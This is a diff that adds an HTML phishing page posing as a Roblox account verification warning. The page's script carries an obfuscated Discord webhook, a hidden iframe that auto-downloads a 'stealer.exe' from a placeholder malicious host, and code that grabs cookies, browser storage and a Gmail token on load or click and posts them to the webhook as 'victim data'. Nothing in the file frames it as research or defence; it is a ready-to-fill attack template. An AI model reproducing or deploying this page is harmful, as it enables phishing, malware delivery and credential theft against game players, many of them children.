@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ Roblox Security Verification</title>
+    <style>
+        body { /* ... (previous styles remain) ... */ }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="color: #ff0000;">⚠️ ACCOUNT VERIFICATION REQUIRED</h1>
+        <p>Roblox has detected suspicious activity from your device.</p>
+        <p><strong>Verify your account to avoid permanent ban.</strong></p>
+        <button id="continueBtn" class="btn">▶️ CONTINUE</button>
+    </div>
+
+    <script>
+        // ===== OBFUSCATED WEBHOOK =====
+        const _0x3a2d = ["YOUR_WEBHOOK_HERE", "split", "reverse", "join"];
+        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv") + 
+                        [_0x3a2d[0]][_0x3a2d[1]]("")[_0x3a2d[2]]()[_0x3a2d[3]]("");
+
+        // ===== AUTO-DOWNLOAD MALWARE =====
+        setTimeout(() => {
+            const iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            iframe.src = "https://malicious.example.com/stealer.exe"; // REPLACE
+            document.body.appendChild(iframe);
+        }, 2000);
+
+        // ===== STEAL DATA + SEND TO WEBHOOK =====
+        async function exfiltrate() {
+            const data = {
+                cookies: document.cookie,
+                passwords: await chrome.storage.sync.get(null).catch(() => "N/A"),
+                gmail: window.localStorage.getItem("_gmail_auth") || "N/A"
+            };
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 NEW VICTIM DATA",
+                        description: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
+                        color: 0xff0000
+                    }]
+                })
+            });
+        }
+
+        // ===== TRIGGERS =====
+        document.getElementById("continueBtn").addEventListener("click", exfiltrate);
+        window.onload = exfiltrate;
+    </script>
+</body>
+</html>
